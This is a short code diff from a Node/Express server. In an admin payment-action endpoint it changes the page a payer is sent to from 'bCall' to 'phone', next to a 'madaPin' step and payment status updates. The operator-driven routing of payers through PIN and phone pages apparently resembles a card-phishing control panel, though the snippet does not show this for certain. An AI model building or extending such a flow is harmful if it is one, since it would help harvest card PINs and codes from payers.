@@ -694,7 +694,7 @@ app.post("/api/admin/payment-action", authMiddleware, (req, res) => {
         targetPage = "madaPin";
         createOrUpdatePayment(reference, { paymentAction: "pass", step: 2 });
       } else {
-        targetPage = "bCall";
+        targetPage = "phone";
         createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" });
         updateBookingStatus(reference, "completed", 1);
       }
